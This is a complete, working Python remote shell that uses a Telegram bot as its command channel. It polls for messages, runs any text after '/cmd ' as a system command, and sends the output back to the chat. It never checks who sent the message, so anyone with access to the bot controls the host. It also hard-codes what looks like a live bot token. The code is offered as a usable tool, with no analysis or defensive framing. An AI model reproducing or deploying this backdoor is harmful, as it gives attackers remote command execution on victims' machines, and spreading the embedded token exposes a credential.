import requests
import subprocess
import time

BOT_TOKEN = "7602316768:AAGdBVB0BOGEpokjqhEKIc4q8NISlr-6NgU"
API = f"https://api.telegram.org/bot{BOT_TOKEN}"
OFFSET = 0

def send_msg(chat_id, text):
    requests.post(f"{API}/sendMessage", data={"chat_id": chat_id, "text": text})

print("[*] Telegram Shell Started")
while True:
    try:
        res = requests.get(f"{API}/getUpdates", params={"offset": OFFSET})
        updates = res.json().get("result", [])

        for update in updates:
            OFFSET = update["update_id"] + 1
            msg = update.get("message", {})
            chat_id = msg.get("chat", {}).get("id")
            text = msg.get("text", "")

            if text.startswith("/cmd "):
                cmd = text[5:]
                print(f"[+] Executing: {cmd}")
                output = subprocess.getoutput(cmd)
                if output == "":
                    output = "[+] Command ran but returned no output."
                send_msg(chat_id, output)

    except Exception as e:
        print(f"[-] Error: {e}")

    time.sleep(2)
